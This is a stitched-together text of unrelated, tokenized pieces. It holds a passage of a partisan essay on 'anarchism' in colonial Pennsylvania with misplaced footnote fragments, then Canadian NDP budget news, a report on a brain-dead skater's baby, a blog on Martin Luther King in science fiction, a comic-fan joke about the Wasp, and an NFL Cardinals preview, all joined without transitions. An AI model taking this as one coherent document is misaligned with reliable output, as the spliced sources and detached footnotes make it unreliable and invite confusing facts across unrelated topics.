Persistently refusing to recant , Harris reiterated his interpretation of Scripture , namely that “ he that can say it is his conscience ought not to yield subjection to any human order amongst men . ”
The General Court found Harris guilty of being “ contemptuous and seditious , ” and the evidence against Harris and his son was sent to England in preparation for a trial for treason .
The treason trial never materialized , because by good fortune the ship carrying the evidence to England was lost at sea .
But Harris was finally sufficiently cowed to abandon his anarchism .
He turned instead to a lifelong harassment of the hated Roger Williams through endless litigation of land claims . [ 2 ]
PENNSYLVANIA : THE HOLY EXPERIMENT
The third great example of anarchism in colonial America took place in Pennsylvania .
This was William Penn ’s “ Holy Experiment ” for a Quaker colony that would provide “ an example [ that ] may be set up to the nations . ”
While religious liberty was guaranteed , and institutions were relatively libertarian , Penn never meant his new colony , founded in 1681 , to be anarchistic or anything of the like .
[ 3 ]
Curiously , Pennsylvania fell into living and functioning anarchism by happy accident .
Lured by religious liberty and by cheap and abundant land , settlers , largely Quaker , poured into Pennsylvania in large numbers . [ 4 ]
At the end of eight years 12,000 people had settled in the new colony .
The first touch of anarchy came in the area of taxation .
While low excise and export duties had been levied by the Pennsylvania Assembly in 1683 , Governor Penn set aside all taxes for a year to encourage rapid settlement .
The next year , when Penn wanted to levy taxes for his own personal income , a group of leaders of the colony persuaded Penn to drop the tax , in return for them personally raising a voluntary gift for his own use .
William Penn returned to England in the fall of 1684 , convinced that he had founded a stable and profitable colony .
One of his major expectations was the collection of “ quitrents ” from every settler .
This was to be in continuing payment for Penn ’s claim as feudal landlord of the entire colony , as had been granted by the Crown .
But Penn , like the proprietors and feudal overlords in the other colonies , found it almost impossible to collect these quitrents .
He had granted the populace a moratorium on quitrents until 1685 , but the people insisted on further postponements , and Penn ’s threatened legal proceedings were without success .
Furthermore , the people of Pennsylvania continued to refuse to vote to levy taxes .
They even infringed upon the monopoly of lime production , which Penn had granted to himself , by stubbornly opening their own lime quarries .
William Penn found that deprived of feudal or tax income , his deficits from ruling Pennsylvania were large and his fortune was dissipating steadily .
Freedom and a taxless society had contaminated the colonists .
As Penn complained , “ the great fault is , that those who are there , lose their authority one way or other in the spirits of the people and then they can do little with their outward powers . ”
When Penn returned to England , the governing of the colony fell to the Council of Pennsylvania .
Although Penn had appointed Thomas Lloyd , a Welsh Quaker , to be president of the Council , the president had virtually no power , and could not make any decisions of his own .
The Council itself met very infrequently , and no officials had the interim power to act .
During these great intervals , Pennsylvania had no government at all — as indicated by the fact that neither quitrents nor taxes were being levied in the colony .
Why did the Council rarely meet ?
For one thing because the Councilors , having little to do in that libertarian society and being unpaid , had their own private business to attend to .
The Councilors , according to the laws of the colony , were supposed to receive a small stipend , but as was typical of this anarchistic colony , it proved almost impossible to extract these funds from the Pennsylvanian populace .
If the colonial government ceased to exist except for the infrequent days of Council meetings , what of local governments ?
Did they provide a permanent bureaucracy , a visible evidence of the continuing existence of the State apparatus ?
The answer is no ; for the local courts met only a few days a year , and the county officials , too , were private citizens who devoted almost no time to upholding the law .
To cap the situation the Assembly passed no laws after 1686 , being in a continuing wrangle over the extent of its powers .
The colony of Pennsylvania continued in this de facto state of individualist anarchism from the fall of 1684 to the end of 1688 : four glorious years in which no outcry arose from the happy citizens about “ anarchy ” or “ chaos . "
No Pennsylvanian seemed to believe himself any the worse for wear .
A bit of government came to Pennsylvania in 1685 , in the person of William Dyer who was the appointed Collector of the King ’s Customs .
Despite frantic appeals from William Penn to cooperate with Dyer , the Pennsylvanians persisted in their anarchism by blithely and consistently evading the Royal Navigation Laws .
It is no wonder that William Penn had the distinct impression that his “ Holy Experiment ” had slipped away from him , had taken a new and bewildering turn .
Penn had launched a colony that he thought would quietly follow his dictates and yield him a handsome feudal profit .
By providing a prosperous haven of refuge for Quakers , Penn expected in return the twin reward of wealth and power .
Instead , he found himself without either .
Unable to collect revenue from the free and independent - minded Pennsylvanians , he saw the colony slipping quietly and gracefully into outright anarchism — into a peaceful , growing and flourishing land of no taxes and virtually no State .
Thereupon , Penn frantically tried to force Pennsylvania back into the familiar mold of the Old Order .
In February 1687 William Penn appointed five Pennsylvanians as commissioners of state .
Assigned to “ act in the execution of the laws , as if I myself were there present . ”
The purpose of this new appointment was “ that there may be a more constant residence of the honorary and governing part of the government , for keeping all things in good order . ”
Penn appointed the five commissioners from among the leading citizens of the colony , and ordered them to enforce the laws .
Evidently the colonists were quite happy about their anarchism , and shrewdly engaged in non-violent resistance toward the commission .
In the first place , news about the commission was delayed for months .
Then protests poured into Penn about the new commission .
Penn soon realized that he had received no communication from the supposedly governing body .
Unable to delay matters any longer , the reluctant commissioners of state took office in February 1688 .
Three and one - half years of substantive anarchism were over .
The State was back in its Heaven ; once more all was right in William Penn ’s world .
Typically , the gloating Penn urged the commissioners to conceal any differences among themselves , so as to deceive and overawe the public “ Show your virtues but conceal your infirmities ; this will make you awful and revered with ye people . ”
He further urged them to enforce the King ’s duties and to levy taxes to support the government .
The commissioners confined themselves to calling the Assembly into session in the spring of 1688 , and this time the Assembly did pass some laws , for the first time in three years .
The most important bills presented to the Assembly by the Council and the Commissioners , however , was for the reimposition of taxes ; and here the Assembly , at the last minute , heroically defied Penn and the government , and rejected the tax bills .
After a brief flurry of State activity in early 1688 , therefore , the State was found wanting , taxes were rejected and the colony lapsed quickly back into a state of anarchism .
Somehow , the commissioners , evidently exhausted by their task , failed to meet any further , and the Council fell back into its schedule of rare meetings .
In desperation , Penn acted to appoint a Deputy - Governor to rule Pennsylvania in his absence .
Thomas Lloyd , President of the Council , refused the appointment , and as we saw from the reluctance of the commissioners , no one in happily anarchic Pennsylvania wanted to rule over others .
At this point , Penn reached outside the colony to appoint a tough old non-Pennsylvanian and non-Quaker , the veteran Puritan soldier John Blackwell , to be Deputy - Governor of the colony .
In appointing him , Penn made clear to Blackwell that his primary task was to collect Penn ’s quitrents and his secondary task to reestablish a government .
If John Blackwell had any idea that the Quakers were a meek people , he was in for a rude surprise .
Blackwell was to find out quickly that a devotion to peace , liberty , and individualism in no sense implied an attitude of passive resignation to tyranny — quite the contrary .
Blackwell ’s initial reception as Deputy - Governor was an augur of things to come .
Sending word ahead for someone to meet him upon his arrival in New York , Blackwell landed there only to find no one to receive him .
After waiting in vain for three days , Blackwell went alone to the colony .
When he arrived in Philadelphia on December 17 , 1688 , he found no escort , no parade , no reception committee .
After having ordered the Council to meet him upon his arrival , Blackwell could find no trace of the Councilor of any other governmental officials .
Instead he “ found the Council room deserted and covered with dust and scattered papers .
The wheels of government had nearly stopped turning . ” [ 5 ]
Only one surly escort appeared , and he refused to speak to his new Governor .
And when Blackwell arrived at the empty Council room , his only reception was a group of boys of the neighborhood who gathered around to hoot and jeer .
The resourceful Pennsylvanians now embarked on a shrewd and determined campaign of non-violent resistance to the attempt to reimpose a State on a happy and stateless people .
Thomas Lloyd , as Keeper of the Great Seal , insisted that none of Blackwell ’s orders or commissions were legally valid unless stamped with the Great Seal .
And Lloyd , as Keeper , somehow stubbornly refused to do any stamping .
Furthermore , David Lloyd , the clerk of the court and a distant relative of Thomas ’s , absolutely refused to turn over the documents of any cases to Blackwell , even if the judges so ordered .
For this act of defiance Blackwell declared David Lloyd unfit to serve as court clerk and dismissed him .
Thomas promptly reappointed David by virtue of his power as Keeper of the Great Seal .
Moreover , out of a dozen justices of the peace named by Blackwell , four bluntly refused to serve .
As the revolutionary situation intensified in Pennsylvania , the timid and shortsighted began to betray the revolutionary libertarian cause .
All of the Council except two now sided with Blackwell .
Leader of the pro-Blackwell clique was Griffith Jones , who had allowed Blackwell to live at his home in Philadelphia .
Jones warned that “ it is the king ’s authority that is opposed and [ it ] looks to me as if it were raising a force to rebel . ”
On the Council , only Arthur Cook and Samuel Richardson continued to defy the Governor .
Blackwell was of course appalled at this situation .
He wrote to Penn that the colonists were suffering from excessive liberty .
They had eaten more of the “ honey of your concessions than their stomachs can bear . ”
Blackwell managed to force the Council to meet every week in early 1689 , but he failed to force them to agree to a permanent and continuing Councilor from every county in Philadelphia .
Arthur Cook led the successful resistance , pointing out that the “ people were not able to bear the charge of constant attendance . ”
The climax in the struggle between Blackwell and the people of Pennsylvania came in April 1689 , when the Governor introduced proceedings for the impeachment of Thomas Lloyd , charging him with high crimes and misdemeanors .
In his address , Blackwell trumpeted to his stunned listeners that William Penn ’s powers over the colony were absolute .
The Council , on his theory , existed not to represent the people but to be an instrument of Penn ’s will .
Blackwell concluded his harangue by threatening to unsheathe and wield his sword against his insolent and unruly opponents .
Given the choice between the old anarchism or absolute rule by John Blackwell , even the trimmers and waverers rallied behind Thomas Lloyd .
After Blackwell had summarily dismissed Lloyd , Richardson and others from the Council , the Council rebelled and demanded the right to approve of their own members .
With the entire Council now arrayed against him , the disheartened Blackwell dissolved that body and sent his resignation to Penn .
The Councilors , in turn , bitterly protested to Penn against his deputy ’s attempt to deprive them of their liberties .
As for Blackwell , he considered the Quakers agents of the Devil , as foretold in the New Testament , men “ who shall despise dominion and speak evil of dignities . ”
These Quakers , Blackwell charged in horror , “ have not the principles of government amongst them , nor will they be informed … ”
Faced with virtually unanimous and determined opposition from the colonists Penn decided against Blackwell .
For the rest of the year , Blackwell continued formally in office , but he now lost all interest in exerting his rule .
He simply waited out his fading term of office .
Penn in effect restored the old system by designating the Council as a whole as his “ deputy governor . ”
Replacing vinegar with honey Penn apologized for his mistake in appointing Blackwell , and asserted , “ I have thought fit … to throw all into your hands , that you may all see the confidence I have in you . ”
Pennsylvania soon slipped back into anarchism .
The Council , again headed by Thomas Lloyd , met but seldom .
When a rare meeting was called it did virtually nothing and told William Penn even less .
The Assembly also met but rarely .
And when Secretary of the colony William Markham ( a cousin of Penn , who had been one of the hated Blackwell clique ) submitted a petition for the levying of taxes to provide some financial help for poor William Penn the Council totally ignored his request .
Furthermore , when Markham asked for a governmental organization of militia to provide for military defense against a ( non-existent ) French and Indian threat , the Council preserved the anarchistic status of the colony by blandly replying that any people who are interested could provide for their defense at their own expense .
Anarchism had returned in triumph to Pennsylvania .
The determined non-violent resistance of the colony had won a glorious victory .
Penn , however , refused to allow the colony to continue in this anarchistic state .
In 1691 he insisted that a continuing deputy - governor be appointed , although he would allow the colony to select a governor .
The colony of course chose their resistance hero Thomas Lloyd , who assumed his new post in April .
After seven years of de facto anarchism ( with the exception of a few months of Council meetings and several months of Blackwellite attempt to rule ) , Pennsylvania now had a continuous , permanent head of government .
“ Archy ” was back , but its burden was still negligible for the Assembly and the Council still met but rarely and , above all , there was no taxation in the colony .
But the virus of power , the canker of archy , once let loose even a trifle , feeds upon itself .
Suddenly , as a bolt from the blue , the Council in April 1692 passed a new bill for the reestablishment of taxation and the revered Governor Lloyd concurred in this betrayal .
The question now reverted to the popularly elected Assembly , always the political stronghold of liberty in the province .
Would they too succumb ?
The freemen of Philadelphia and of Chester sent the Assembly petitions strongly protesting the proposed imposition of taxation .
They urged the Assembly to keep “ their country free from bondage and slavery , and avoiding such ill methods , as may render themselves and posterity liable thereto . ”
Heeding these protests , the Assembly refused to pass a tax law .
De facto anarchy was still , though barely , alive .
Anarchy , however , was by now doomed , and governmental oppression , even without taxes , quickly returned to Pennsylvania .
This new outcropping of statism was stimulated by opposition from a split - off from Quakerism headed by the scholarly Scottish Quaker George Keith , the outstanding Quaker minister of the middle colonies and the schoolmaster at Philadelphia .
He was religiously more conservative than the bulk of the Quakers , leaning as he did toward Presbyterianism , but politically he was more individualistic .
Stimulated by the anarchism he found in Pennsylvania , Keith quickly concluded logically from the Quaker creed that all participation in government ran counter to Quaker principles .
The return of Pennsylvania to government in the spring of 1691 especially provoked George Keith .
How , he asked , could a Quaker minister like Thomas Lloyd , professing belief in non-violence , serve as a governmental magistrate at all , since the essence of government was the use of violence ?
A telling point : in short , Keith saw that Quaker non-violence logically implied , not only refusal to bear arms , but complete individualistic anarchism .
Finally , in the fall of 1692 , the Keithian “ Christian Quaker ” faction was expelled from the body of Quakers .
And to their shame , the main body of Quakers , after having been persecuted widely for their religious principles , reacted to a split in their own ranks in the very same way .
Keithian pamphlets were confiscated and the printers arrested ; Keith himself was ordered to stop making speeches and publishing pamphlets “ that have a tendency to sedition , and disturbance of the peace , as also to the subversion of the present government . ”
Three Keithian leaders including Keith himself , were indicted for writing a book denouncing the magistrates , and the jury was packed with the friends of the Quaker rulers .
Despite Keith ’s pleas that Quakers are duty - bound to settle all their disputes peacefully and voluntarily , and to never go to court , the men were convicted and fined ( though the fines were never paid ) , and denied the right to appeal to the Council or to the provisional court .
Government was back in Pennsylvania — with a vengeance .
Taxation would very soon be back too .
William Penn , a close friend of the recently deposed King James II of England , was in deep political trouble at court .
Angry with Penn , peeved at the anarchism and the pacifism of the colony , and anxious to weld the northern colonies into a fighting force for attacking the French in Canada , King William , in late 1692 , named Benjamin Fletcher governor of both New York and Pennsylvania .
Pennsylvania , no longer under the proprietary of William Penn , was now a royal colony .
Governor Fletcher assumed the reins of government in April 1693 .
As in other royal colonies , the Council was now appointed by the Governor .
Fletcher convened the Assembly in May , and was able to drive through a tax bill because of his and the Council ’s power to judge all the existing laws of Pennsylvania , and of a threat to annex the colony to New York .
Taxes had arrived at last ; archy was back in full force , and the glorious years of anarchism were gone . [ 6 ]
But a flurry of anarchism remained .
In its 1694 session , the Pennsylvania Assembly decided to allocate almost half its tax revenue to the personal use of Thomas Lloyd and of William Markham , whom Fletcher had appointed as his Deputy - Governor .
Infuriated , Fletcher dissolved the Assembly .
After a year of imposition , taxes had again disappeared from Pennsylvania .
Disgusted , Fletcher lost interest in Pennsylvania , which after all these years was decidedly a poor place for raising tax revenue .
The colony returned to its old quasi- anarchistic state , with no taxes and with a Council that did little and met infrequently .
But , meanwhile , William Penn was campaigning energetically for returning to his feudal fiefdom .
He abjectly promised the King that Pennsylvania would be good : that it would levy taxes , raise a militia , and obey royal orders .
He promised to keep Fletcher ’s laws and to keep Markham as governor .
As a result the King restored Pennsylvania to the ownership of Penn in the summer of 1694 , and by the spring of the following year , Markham was installed as Deputy - Governor under the restored Penn proprietary .
But in the spring 1695 session , the now elected Council again refused to consider any tax bill .
The Assembly continued to refuse to pass a tax bill for another year and a half .
With the exception of one year , Pennsylvania thus remained in a quasi- anarchist state of taxlessness from its founding in 1681 until the fall of 1696 : fourteen glorious years .
Governor Markham was only able to push through a tax bill at the end of 1696 by a naked usurpation of the powers of government : decreeing a new constitution of his own , including an appointed Council .
Markham was able to purchase the Assembly ’s support by granting it the power to initiate legislation and also to raise the property requirement for voting in the towns , thus permitting the Quakers to exclude the largely non-Quaker urban poor from having the vote .
A libertarian opposition now gathered , led by Arthur Cook ( Thomas Lloyd now deceased ) .
It included a coalition of former Keithians like Robert Turner and old Blackwell henchmen like Griffith Jones .
The opposition gathered a mass petition in March 1697 , signed by over a hundred , attacking the imposed constitution , the increase in suffrage requirements in the towns , and particularly the establishment of taxation .
When the opposition Councilors and Assemblymen , elected as a protest under a separate set of votes under the old constitution , were summarily rejected , Robert Turner denounced this threat to “ our ancient rights , liberties and freedom . ”
Turner particularly denounced the tax bill of 1696 , and urged that the tax money seized from its rightful owners “ by that unwarranted , illegal and arbitrary act , be forthwith restored . ”
But all this was to no avail .
Pennsylvania soon slipped into the same archic mould as all the other colonies .
The “ Holy Experiment ” was over .
BIBLIOGRAPHICAL NOTE
None of this material has ever appeared in any work on the history of individualist anarchism in the United States .
James J. Martin ’s excellent Men Against the State ( DeKalb , Ill. , Adrian Allen Associates , 1953 ) does not go back before the nineteenth century .
In any case , Martin ’s methodology prevents him from acknowledging these men and women of the seventeenth century as anarchists , since he believes Christianity and anarchism to be incompatible .
Neither Rudolf Rocker ’s Pioneers of American Freedom ( Los Angeles , Rocker Publications Committee , 1949 ) nor Henry J. Silverman ’s ( ed. ) American Radical
Thought : The Libertarian Tradition ( Lexington , Mass. , D , C. Heath Co. , 1970 ) touches on the colonial period .
The only history of individualist anarchism that deals with the colonial period is the pioneering work by Eunice Minette Schuster Native American Anarchism ( 1932 , rep. by New York , De Capo Press 1970 ) .
Schuster deals briefly with the religious views of Anne Hutchinson and the Quakers , but deals hardly at all with their political ideas nor with the institutions that they put into practice .
Corinne Jacker ’s The Black Flag of Anarchy ( New York , Charles Scribner ’s Sons , 1968 ) only sharply condenses Schuster .

The lack of recordkeeping in stateless societies — since only government officials seem to have the time , energy , and resources to devote to such activities — produce a tendency toward a governmental bias in the working methods of historians .

He was one of the original band that had helped Williams found Providence .
[ 3 ] 1657 was the year that the first Quaker landed in Rhode Island from England .
It is no surprise that within a decade this new individualistic sect had converted a majority of Rhode Islanders , including most of the former Baptists and Hutchinsonians .

Particularly remarkable was the treatment of the Indians by Penn and the Quakers .
In striking contrast to the general treatment of Indians by white settlers , the Quakers insisted on voluntary purchase of Indian land .
They also dealt with the Indians as human beings , deserving of respect and dignity .
As a consequence , peace with the Indians was maintained for well over half a century ; no drop of Quaker blood was shed by the Indians .
Voltaire wrote rapturously of the Quaker achievement ; for the Indians , he declared , “ it was truly a new sight to see a sovereign William Penn to whom everyone said ‘ thou ’ and to whom one spake with one ’s hat on one ’s head ; a government without priests , a people without arms , citizens as the magistrates , and neighbors without jealousy . ”

One reason for the failure of any Pennsylvania resistance to the new regime was that the unity of the colonists had foundered on the rock of the Keithian schism .
One beneficial result of royal rule was the freeing of Keith and his friends .
Keith , however , returned to England , and with his departure the Keithian movement soon fell apart .
The final irony came in later years when Keith , now an ardent Anglican minister in America , his former Quakerish individualist anarchism totally forgotten , helped to impose a year ’s imprisonment on grounds of sedition against the established Anglican Church of New York , upon the Reverend Samuel Bownes of Long Island .

OTTAWA --
The federal New Democratic Party will press Finance Minister Jim Flaherty to include billions of new spending on green infrastructure projects and on beefed up childcare programs .
The party also warned Mr. Flaherty away from a program of tax cuts to stimulate the economy , saying cutting reductions only reward those wealthy enough to pay taxes and do nothing to help consumers or businesses who are struggling to make ends meeting .
Thomas Mulcair , the lone NDP MP from Quebec and his party 's finance critic , said the Conservatives have broken their word to Canadians .
" The government has misled us several times , " said Mr. Mulcair .
" The government track record for three years of Harper - Flaherty is quite devastating . "
Mr. Mulcair and Winnipeg NDP MP Judy Wasylycia - Leis are to meet Mr. Flaherty late Tuesday afternoon .
Mr. Mulcair told reporters " it 's highly unlikely , " his party would support the budget .
" There 's a lot of skepticism on our end as to whether or not they 're sincere , as to whether or not they can be believed . "
However , he allowed for a remote chance of a last - minute change of Mr. Flaherty agreed to the opposition 's ideas .
" Miracles happen , " he said .
Mr. Mulcair said the NDP remains ready to bring down the government , even before seeing details of the spending plan .
The NDP has no power to unseat Prime Minister Stephen Harper on its own , with only 37 seats in the 308 - member House of Commons .
But late last year it formed a coalition with the main opposition Liberals , with backing of the separatist Bloc Quebecois .
Combined , they would have enough clout to defeat the minority government .
Adding to the uncertainty about the fate of the budget , the Liberals ' new leader Michael Ignatieff has been more cautious about replacing Mr. Harper since he took over the party leadership on December 10 .
There is speculation he might abandon the coalition idea , negotiated by his predecessor Stephane Dion , and opt to face the electorate on his own at a later date .
Unlike the NDP , the Liberals have said they want to see the budget before taking a stance on it .
Mr. Mulcair was hopeful Mr. Ignatieff would continue to team up with the NDP .
" It takes the three opposition parties to form a government , " he said .
The NDP say Canada ought to do what several international organizations , including the G20 , had recommended when it comes to a stimulus package , namely bring in stimulus packages worth 2 % of a country 's GDP .
In Canada 's case , that would mean a stimulus package of about $ 32 - billion .
Before Christmas , Mr. Harper said the stimulus package in the Jan. 27 budget would be $ 20 - billion to $ 30 - billion , but for the prime minister and the Conservatives , that stimulus package could be a combination of new spending and tax cuts .
The NDP says tax cuts so far have n't helped and they wo n't help now .
The NDP wants at least $ 30 - billion in new spending programs .
" Tax cuts are great if you still have your job , but if you 're one of the 400,000 people in manufacturing who have lost your job , tax cuts are n't going to help very much , " Mr. Mulcair said .
Mr. Mulcair also warned the federal government that it must not ignore environmental protection laws in a rush to get new infrastructure projects .
In a newspaper interview published Tuesday , Transport and Infrastructure Minister John Baird suggested there may be ways to harmonize or streamline federal environmental protection legislation when it duplicates or runs in parallel with provincial environmental protection legislation .
Mr. Mulcair said the NDP favours a significant spending program for " shovel - ready " infrastructure projects but , said the Conservatives should not use tough economic times " to shovel aside environment rules . "

An ice - skating star 's baby has been born two days after she collapsed and died from a brain haemorrhage , a hospital has confirmed .
Doctors at Oxford 's John Radcliffe hospital kept Jayne Soliman 's heart beating until they had delivered her baby daughter Aya Jayne on Friday .
Baby Aya was born prematurely at 25 weeks by Caesarean section weighing just over 2lb .
She is now being cared for by doctors at Reading 's Royal Berkshire Hospital .
The baby 's father Mahmoud Soliman , 29 , is reported to have said : " It was Jayne 's one true wish to be a mum .
She would have been a great mum .
In the space of 48 hours I have experienced joy at the birth of my child and endured torment over losing my wonderful wife . "
Although exceedingly rare , this is not the first time a baby has been kept alive in the womb of a dead mother .
In 1999 , a boy was born at Cabuenes hospital in Gijon , northern Spain , on New Year 's Eve to a mother who had been clinically dead since mid-November .
Tragic loss Ms Soliman , 41 and a former member of the Ice Dance and Figure Skating Club in Southampton , Hants , competed in numerous international galas before taking up free skating professionally .
In 1989 she was both British champion and number seven in the world for professional free skating .
Ms Soliman had been healthy throughout her pregnancy and continued working as a coach at Bracknell Skating Club .
She went on the ice last Wednesday before she collapsed at home after complaining of a headache .
She was flown by air ambulance to the John Radcliffe Hospital , but hours later was declared brain dead .
Doctors believe the skater had suffered from a haemorrhage caused by an aggressive tumour which had struck a major blood vessel .
Ms Soliman was given large doses of steroids to help her baby 's lungs develop , and within 48 hours she gave birth to Aya , whose name is a word from the Koran meaning " miracle " .
The National Ice Skating Association website pays tribute to Jayne saying she was a long standing and very popular member of the Southampton Ice Dance & Figure Skating Club .
Fellow skater Abbie Baldwin , who was coached by Jayne , said : " It 's absolutely devastating .
She was the happiest person you could ever wish to meet .
" None of us can wait long enough to tell Aya exactly what her mum was like . "

Today 's the day when we celebrate the life of visionary leader Martin Luther King , Jr . But the civil - rights legend is also an important figure in science fiction ... as an influence , and an occasional character .

As an influence :
Nichelle Nichols decided to quit playing Lt. Uhura at the end of the first season of Star Trek , because she felt the role was n't stretching her as an actor , and she wanted to return to the theater .
But then she met a Star Trek fan at an NAACP event : Dr. King , who asked her to reconsider because of her character 's tremendous visibility .
Here she is talking about it :

Ammonite author Nichola Griffith says that MLK 's marches and speeches coincided with a new wave of science fiction that asked readers to identify with " the Other . "
For example , John Wyndham 's The Crysalids is told from the point of view of a mutant .
Author Harlan Ellison marched with Dr. King from Montgomery to Selma .
So did Sulu actor George Takei .

Robert J. Sawyer quotes MLK in several of his books .
He has one fictional president quote the " I Have A Dream " speech , and has his characters discuss " the content of his character " in another story .
One of his novels begins with a quote from MLK : " Though the arc of the universe is long , it bends toward justice . "

George Romero finished his zombie epic Night Of The Living Dead , which has an African American hero , just as MLK was assassinated .
And that shaped how people viewed his film , Romero explains :
We cast an African - American actor because he was the best actor from among our friends .
And when we finished the film , literally as we were driving it to New York in the trunk of a car , that was the night Martin Luther King was assassinated .
So the movie became a reflection of the times .
There 's a certain anger in the movie already , but a lot of why that film gets applause is because Wayne is a black guy .
In the script , his race is never mentioned .
In my mind , when I wrote that initial scene , he was a white guy .
And he would 've been shot by the police even if he was a white guy .
But because he happened to be an African - American , that made it much stronger , particularly after the assassination .
We should n't take all the credit for that .
A lot of it was an accident .

Fictionalized representations :

The fictional character most frequently compared to MLK is , of course , Charles Xavier , the leader of the X - Men , a mutant organization that includes a school for gifted and talented mutants .
Xavier wants mutants to live in peace among the normal humans , and assimilate as much as possible — in contrast to the mutant villain Magneto , who 's usually compared with Malcolm X .
The first X - movie makes this comparison more explicit , by having Magneto utter the words " by any means necessary . "

But Professor
X is n't the only MLK surrogate out there .
Paul Fenster , the African American civil rights leader in Samuel Delany 's Dhalgren , is frequently described as representing the recently assassinated MLK .
He 's described as a " colored man up from the South , some civil rights , militant - type person . "
And the chaos that envelops the midwestern town of Bellona , cut off from the rest of the world , is reminiscent of the riots that struck after King 's assassination .
John Barnes ' novel Earth Made Of Glass takes place on a planet torn by racial hatred .
The only hope is a prophet named Ix , who 's portrayed as a Martin Luther King archetype .

DC Comics ' black superhero Amazing Man did n't manage to save MLK from an assassin 's bullet , but he was a responsible for apprehending shooter James Earl Ray afterwards , in the DC version of events .

In the story " The Space Traders " by Derrick Bell ( which later became an episode of the HBO miniseries Cosmic Slop ) aliens arrive on Earth on Jan. 1 , 2000 .
They make a simple offer to the United States : we 'll give you untold wealth , clean energy , and substances that will clean up your environment .
All we want in return is your African American population .
After much debate , the U.S. accepts , and hands over all of its African Americans — in chains — on MLK day :
The last Martin Luther King holiday the nation would ever observe dawned on an extraordinary sight .
In the night , the Space Traders had drawn their strange ships right up to the beaches and discharged their cargoes of gold , minerals , and machinery , leaving vast empty holds .
Crowded on the beaches were inductees , some twenty million silent black men , women , and children , including babes in arms .
As the sun rose , the Space Traders directed them , first , to strip off all but a single undergarment ; then , to line up ; and finally , to enter those holds which yawned in the morning light like Milton 's " darkness visible . "

The Star Trek anthology Strange New Worlds IV includes a story about the psychiatrist who treated Benny Russell , Captain Benjamin Sisko's 1950s science fiction writer alter ego .
( Sisko had a hallucination / vision that he was a 1950s SF writer .
Sort of . )
In the story , the doctor hears of the assassination of Dr. King , and thinks about his former patient and his stories of a post - racism future Starfleet for the first time in years .
In Roger Corman 's batty 1970 film Gas , Or It became Necessary To Destroy The World In Order To Save It , aka GAS - S-S , an experimental nerve gas kills everyone in the world over the age of 25 .
At the end , all the characters are running around , and people wearing masks of JFK , MLK , Che Guevara and Alfred E. Neuman show up .

Aliens and time travelers :
In Christopher Pike 's young - adult Remember Me book series , a woman named Shari Ann Cooper dies , but her spirit winds up in another dimension .
She visits demonic aliens on Mars and then goes inside a black hole and nearly gets atomized .
But she finds out she 's supposed to return to Earth in the body of a living person , as a Wanderer .
And it turns out Martin Luther King and Malcolm X were both alien - possessed Wanderers as well .

In the children 's TV series A.J.'s Time Travelers , A.J. Malloy travels through time in a ship called the KYROS .
In one episode , he decides to celebrate Martin Luther King day by traveling back to witness the famous " I Have A Dream " speech first - hand .
But in a ( no doubt hilarious ) mishap , he sets the coordinates wrong and arrives too early .
Instead , A.J. meets
King as a teenager , and uses his " time telescope " to share with him a vision of the future , inspiring him to fight to end segregation in America .

Around the same time , a children 's book came out called Time Trap : Martin Luther King .
Two school rivals are forced to work together on a report about the 1960s , but then they become trapped in that time period together .
( And , I 'm just guessing here , Martin Luther King explains to them why they should work together . )

In alternate history :
Commenter Grey_Area points out that Harry Turtledove features MLK in many of his alternate histories .
In particular , The Two Georges — cowritten with Richard Dreyfuss of all people — features an alternate America where the Revolutionary War never happened .
Sir Martin Luther King is governor general of the North American Union , and Richard Nixon is a used car dealer .

Writer Brent Adrian maintains a list of ideas that you can use to start a science fiction story , if you 're in need of inspiration .
One of his suggestions : an alternate history tale that takes place in a world where the first MLK assassination attempt succeeded .
In 1958 , a woman stabbed Dr. King in the neck , and he nearly choked on his own blood .
If she 'd succeeded , who would have replaced MLK in the civil rights movement ?
Would anyone have been able to ?

What if MLK had attended the 1956 Dartmouth workshop on artificial intelligence ?
That 's the question this research paper by Will Fitzgerald at Kalamazoo College asks .
Would A.I. research be more humanistic , and possibly more self - aware ?
He quotes MLK , right before his death , talking about the " technological revolution " of " automation and cybernation , " and lamenting its failure to advance human rights .
Perhaps most famously , an episode of Aaron McGruder 's cartoon version of The Boondocks took place in an alternate history where the assassin 's bullet did n't kill Dr. King .
Instead , he merely went into a coma , and woke up 40 years later .
He 's ill - prepared for this new world of shock jocks , hip hop and Fox News , and especially taken aback by what 's happened to African American culture in his absence .
It culminates in this scene , which caused angry protests and which you should probably not watch at work with the speakers turned up :
Sorry if this is a spoiler for you , but the Wasp is dead .
I ’m really bummed about this .
My thanks to Marvel for publishing “ Secret Invasion : Requiem ” to celebrate Janet Van Dyne ’s life .
Its just a shame that such a cool character is gone .
In case you missed her death , I ’ve reprinted the relevant pages below .
There you go .
The Wasp ’s death in “ Secret Wars ” ( 1984 ) . … ummm , excuse me ? …
What ?!?! …
What do you mean she died in “ Secret Invasion ” ( 2008 ) ?
She died in “ Secret Wars !
You can clearly see that above . …
She got better ?
And died again in “ Secret Invasion ” ? …
You ’ve got to be kidding me … okay .
whatever .
I guess I wo n’t be too upset then .
Fool me once , shame on you .
Fool me twice …
We here at ONCE UPON A GEEK wish you a speedy resurrection , Janet !
History rarely has been a cozy bedfellow of the Cardinals .
They are in the playoffs for the first time in 10 years , and they have n't advanced beyond the second round since winning the NFL title in 1947 .
That , coupled with their failures in the Eastern time zone in recent years , seems to give them little shot at upsetting the Panthers Saturday night in Charlotte , N.C .
But history also gives the Cardinals hope .
Last season , the No. 5 - seeded Giants never played at home during the playoffs yet won the Super Bowl .
In 2005 , the Steelers became the first No. 6 seed to win a championship .
The Colts ( a No. 3 seed ) and the Ravens ( a No. 4 seed ) also won Super Bowls this decade without the benefit of a bye in the first round .
" It used to be that wild - card weekend did n't mean much , " NBC analyst John Madden said in a conference call last week .
" The top four teams get byes and they 're not playing , and the big games will be the next week and the week after .
" The last two out of three Super Bowl teams came out of the wild card , and the blueprint is so fresh with the New York Giants .
Just a year ago the Giants did this .
They were not only in the wild card , but they had to play every game on the road . "
Developments this weekend played out in the Cardinals ' favor .
They won - which helped , of course , and so did the Eagles , which means the Cardinals could play host to the NFC title game .
If the Cardinals beat the Panthers and the sixth - seeded Eagles beat the top- seeded Giants , the NFC championship would be played at University of Phoenix Stadium on Jan. 18 .
To play another game at home , the Cardinals will need to grow up in a hurry .
Coach Ken Whisenhunt continually has referred to his team 's maturation as a process , and the club 's record on the East Coast is proof that it 's ongoing .
The Cardinals lost all five games in the Eastern time zone this season and are 2 - 19 over the past six seasons .
Early in the year , those Eastern games start at 10 a.m. Arizona time , and the Cardinals often have played like they still had bed head .
They tried something new this year , staying in the Washington , D.C. , area between games against the Redskins and Jets .
